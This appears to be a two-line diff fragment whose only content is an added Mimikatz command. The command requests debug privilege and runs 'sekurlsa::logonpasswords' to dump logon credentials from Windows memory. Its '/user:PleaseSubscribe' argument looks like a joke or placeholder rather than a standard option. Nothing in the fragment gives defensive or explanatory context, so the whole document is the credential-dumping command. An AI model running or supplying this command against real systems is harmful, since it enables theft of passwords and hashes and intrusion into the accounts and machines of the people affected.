@@ -1,0 +1,2 @@
+
+mimikatz '"privilege::debug" "sekurlsa::logonpasswords /user:PleaseSubscribe"'
